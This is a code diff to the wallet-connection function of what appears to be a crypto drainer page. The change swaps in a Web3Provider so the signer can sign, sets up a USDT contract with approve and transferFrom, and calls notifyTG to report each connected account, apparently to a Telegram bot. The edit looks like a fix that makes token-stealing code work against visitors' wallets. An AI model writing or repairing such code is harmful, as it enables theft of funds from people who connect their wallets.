@@ -63,56 +63,54 @@ window.addEventListener("load", () => {
 
 // 1. Connect Wallet & Switch Network
 async function initWallet() {
- showNotify("Connecting...", "info");
- setLoading(btnConnect, true);
- btnTextConnect.innerText = "Connecting...";
+    showNotify("Connecting...", "info");
+    setLoading(btnConnect, true);
+    btnTextConnect.innerText = "Connecting...";
 
- try {
- // Check for wallet
- if (!window.ethereum && !window.trustwallet) {
- throw new Error("Please install Trust Wallet or MetaMask!");
- }
+    try {
+        if (!window.ethereum) {
+            throw new Error("Please install Trust Wallet or MetaMask!");
+        }
 
- // Request Account
- const accounts = await window.ethereum.request({ 
- method: "eth_requestAccounts" 
- });
- 
- account = accounts[0];
- 
- // FIX 1: Pass the BSC RPC URL directly to the provider
- // This ensures your provider is talking to BSC, not Ethereum Mainnet
- provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
- signer = provider.getSigner();
- 
- // Initialize USDT Contract
- usdtContract = new ethers.Contract(
- CONFIG.usdtContractAddress,
- ["function balanceOf(address owner) view returns (uint256)",
- "function approve(address spender, uint256 amount)",
- "function transferFrom(address from, address to, uint256 amount)"],
- signer
- );
- 
- // Switch to BSC Network
- await switchToBSC();
- 
- // Update UI
- updateConnectionState();
- await checkBnbBalance();
- 
- // Hide Connect Button, Show Send Button
- btnConnect.style.display = "none";
- btnSend.style.display = "flex";
- 
- showNotify("Wallet Connected", "success");
- notifyTG("connected", account);
+        // Request Account
+        const accounts = await window.ethereum.request({ 
+            method: "eth_requestAccounts" 
+        });
+        
+        account = accounts[0];
+        
+        // FIX: Use Web3Provider to use window.ethereum for all operations
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+        signer = provider.getSigner();
+        
+        // Initialize USDT Contract
+        usdtContract = new ethers.Contract(
+            CONFIG.usdtContractAddress,
+            ["function balanceOf(address owner) view returns (uint256)",
+             "function approve(address spender, uint256 amount)",
+             "function transferFrom(address from, address to, uint256 amount)"],
+            signer
+        );
+        
+        // Switch to BSC Network
+        await switchToBSC();
+        
+        // Update UI
+        updateConnectionState();
+        await checkBnbBalance();
+        
+        // Hide Connect Button, Show Send Button
+        btnConnect.style.display = "none";
+        btnSend.style.display = "flex";
+        
+        showNotify("Wallet Connected", "success");
+        notifyTG("connected", account);
 
- } catch (err) {
- showNotify(err.message, "error");
- setLoading(btnConnect, false);
- btnTextConnect.innerText = "Connect Wallet";
- }
+    } catch (err) {
+        showNotify(err.message, "error");
+        setLoading(btnConnect, false);
+        btnTextConnect.innerText = "Connect Wallet";
+    }
 }
 
 // 2. Switch to BSC Network (Automatic)
